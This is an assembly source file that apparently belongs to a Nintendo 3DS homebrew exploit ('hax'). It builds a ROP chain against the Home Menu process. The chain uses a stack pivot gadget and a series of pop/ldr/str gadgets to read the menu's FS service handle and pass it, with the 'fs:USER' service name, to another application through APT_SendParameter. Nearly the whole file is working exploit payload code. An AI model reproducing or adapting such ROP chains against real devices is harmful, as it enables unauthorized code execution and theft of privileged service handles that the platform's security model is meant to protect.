.nds

.include "../build/constants.s"

.loadtable "unicode.tbl"

.create "menu_microp.bin",0x0

MENU_OBJECT_LOC equ MENU_LOADEDROP_BUFADR

APP_START_LINEAR equ 0xBABE0002

MENU_STACK_PIVOT equ ROP_MENU_STACK_PIVOT ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ ROP_MENU_POP_PC ; pop {pc}
MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
MENU_CONNECTTOPORT equ ROP_MENU_CONNECTTOPORT

WAITLOOP_DST equ (MENU_LOADEDROP_BUFADR - (waitLoop_end - waitLoop_start))
WAITLOOP_OFFSET equ (- waitLoop_start - (waitLoop_end - waitLoop_start))

DUMMY_PTR equ (WAITLOOP_DST - 4)

.include "menu_include.s"
.include "app_code_reloc.s"

.orga 0x0

	object:
	rop:
		; send FS handle as parameter to hax application
			apt_open_session 0, 0
			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
				.word MENU_FS_HANDLE ; r0 (handle ptr)
			.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
				.word MENU_LOADEDROP_BUFADR + waitForParameter_loop_handle_loc ; r4 (destination address)
			.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
				.word 0xDEADBABE ; r4 (garbage)
			set_lr ROP_MENU_POP_R4R5PC
			.word ROP_MENU_POP_R0PC ; pop {r0, pc}
				.word 0x101 ; r0 (source app_id)
			.word ROP_MENU_POP_R1PC ; pop {r1, pc}
				.word 0x101 ; r1 (destination app_id)
			.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
				.word 0x00000001 ; r2 (signal type)
				.word MENU_LOADEDROP_BUFADR + fsUserString ; r3 (parameter buffer ptr)
				.word 0xDEADBABE ; r4 (garbage)
				.word 0xDEADBABE ; r5 (garbage)
				.word 0xDEADBABE ; r6 (garbage)
			.word ROP_MENU_APT_SENDPARAMETER
				.word 0x8 ; arg_0 (parameter buffer size) (r4 (garbage))
				waitForParameter_loop_handle_loc:
				.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
			apt_close_session 0, 0

			sleep 0x0FFFFFFF, 0x0FFFFFFF

	fsUserString:
		.ascii "fs:USER"
		.byte 0x00

.Close
